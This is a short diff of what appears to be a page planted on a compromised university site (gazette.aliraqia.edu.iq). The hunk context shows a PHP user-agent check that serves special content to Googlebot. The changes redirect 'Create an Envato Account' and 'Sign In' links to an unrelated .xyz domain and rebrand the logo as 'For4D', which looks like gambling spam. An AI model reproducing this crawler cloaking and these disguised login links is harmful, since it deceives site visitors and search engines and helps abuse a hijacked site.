@@ -1322,11 +1322,11 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
                         <i class="e-icon -icon-cart"></i>
                     </div>
                 </a>
-                <a class="off-canvas-right__link" href="https://rajamantap.pro/">
+                <a class="off-canvas-right__link" href="https://amplaspride.xyz/amp/gazette.aliraqia.edu/">
                     Create an Envato Account
                     <i class="e-icon -icon-envato"></i>
                 </a>
-                <a class="off-canvas-right__link" href="https://rajamantap.pro/">
+                <a class="off-canvas-right__link" href="https://amplaspride.xyz/amp/gazette.aliraqia.edu/">
                     Sign In
                     <i class="e-icon -icon-login"></i>
                 </a>
@@ -1378,7 +1378,7 @@ if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']), "googlebot"))
 
                                 <div class="header-mini__logo" bis_skin_checked="1">
                                     <a href="https://gazette.aliraqia.edu.iq/">
-                                        <img alt="Logo Raja"
+                                        <img alt="Logo For4D"
                                             src="https://xyven.xyz/images/biawak.png"
                                             style="height:40px; width:auto; display:inline-block;">
                                     </a>
